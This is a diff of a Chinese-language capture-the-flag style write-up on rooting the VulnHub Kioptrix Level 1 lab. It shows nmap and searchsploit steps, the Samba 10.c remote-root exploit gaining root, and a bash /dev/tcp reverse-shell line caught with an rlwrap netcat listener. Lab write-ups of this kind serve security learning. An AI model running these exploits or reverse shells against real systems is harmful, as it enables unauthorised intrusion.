@@ -1,7 +1,18 @@
 ---
 title: Vulnhub-KioptrixLevel1通关记录
 tags:
+  - 靶场
+  - Kioptrix
+  - vulnhub
+  - WriteUp
+categories: WriteUp
+keywords: vulnhub
+description: 本文记录了作者在通关vulnhub靶机Kioptix Level1中遇到的问题以及踩坑后的解决方案。涉及smb爆破，终端稳定性提高等有效操作。
+cover: https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg
+top_img: https://pic.imgdb.cn/item/653b2755c458853aef761f44.jpg
+date: 2023-10-27 10:45:07
 ---
+
 
 ## 靶机描述
 
@@ -40,10 +51,9 @@ $ sudo nmap -sT -p22,80,111,139,443,1024 -sV -sC -O --min-rate 10000 10.8.12.128
 1024/tcp open  status      1 (RPC #100024)
 .......
 
-Linux 2.4.9 - 2.4.18 (likely embedded) (97%)......
 ```
 
-根据 `nmap` 的扫描结果，可以看到靶机开放了22，80，111，139，443，1024端口，对应的服务分别为 ssh ，web ， smb ，rpc。 
+根据 `nmap` 的扫描结果，可以看到靶机开放了22，80，111，139，443，1024端口，对应的服务分别为 ssh ，web ， smb ，rpc<sup>[①](#RPC协议)</sup>。 
 
 ### Web 目录扫描
 
@@ -70,7 +80,7 @@ Linux 2.4.9 - 2.4.18 (likely embedded) (97%)......
 通过 `searchsploit` 查询到 `Apache 1.3.20` 存在 RCE 漏洞，将对应的脚本 `67.c` 复制到本地后进行使用 `gcc` 编译，但编译后爆破攻击失败。
 
 ```
-$ searcgsploit Apache 1.3
+$ searchsploit Apache 1.3
 
 .....
 Apache 1.3.x mod_mylo - Remote Code Execution | multiple/remote/67.c 
@@ -114,6 +124,9 @@ Have a nice day!
 发现靶机开放了139端口，使用 `msf` 对 smb 服务进行攻击。
 
 ```
+$ searchsploit samba | grep 10.c
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c
+
 $ ./a.out -b0 10.8.12.128
 samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
 --------------------------------------------------------------
@@ -126,8 +139,32 @@ Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
 uid=0(root) gid=0(root) groups=99(nobody)
 whoami
 root
+tty
+not a tty
 ```
 
+尝试的是将反弹的shell升级为完整的TTY（交互式shell），直接再shell中再次发起回连，然后在攻击机上使用 `rlwrap` 监听。
+
+```
+# target
+/bin/bash -i >& /dev/tcp/192.168.213.129/10234 0>&1
+```
+
+```
+# kali
+$ rlwrap nc -lvnp 10234                                             
+listening on [any] 10234 ...
+connect to [192.168.213.129] from (UNKNOWN) [192.168.213.128] 1026
+bash: no job control in this shell
+[root@kioptrix tmp]#  
+```
+
+虽然仍然不是完整的TTY，但是支持用方向键查看历史记录了，并且用户权限为root权限，测试结束。
+## 总结
+
+这个靶机比较简单，来源于[@TJ_Null](https://twitter.com/TJ_Null)大神更新的 [NetSecFocus Trophy Room(Oct 12, 2023)](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit?pli=1#gid=998752843)。比较费时的是之前的两次失败尝试，让我在简单靶机上耽搁和浪费了不少时间。
+
+总而言之，在渗透过程中，攻击者应该做好攻击向量的资源分配，以免出现事半功倍的情况。
 ## 注释
 
 ### RPC协议
